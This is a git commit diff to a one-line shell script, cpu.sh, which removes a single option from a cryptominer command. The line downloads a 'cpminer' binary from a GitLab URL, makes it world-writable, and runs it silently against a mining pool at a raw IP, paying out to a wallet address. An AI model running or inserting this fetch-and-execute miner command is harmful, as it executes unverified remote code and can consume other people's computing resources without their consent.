540f5afe09713c569f1ba5bf69f760b39d7b6820
MJVideo <majapahlevi@gmail.com>
2024-06-12 02:33:49 +0000

    Update cpu.sh

--- cpu.sh
+++ cpu.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QT5J7ALoKpg93HLbYeZMaViNw3ivWaHX6b -t4 -p m=solo > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcps://165.227.180.199:80 -u QT5J7ALoKpg93HLbYeZMaViNw3ivWaHX6b -t4 > /dev/null 2>&1
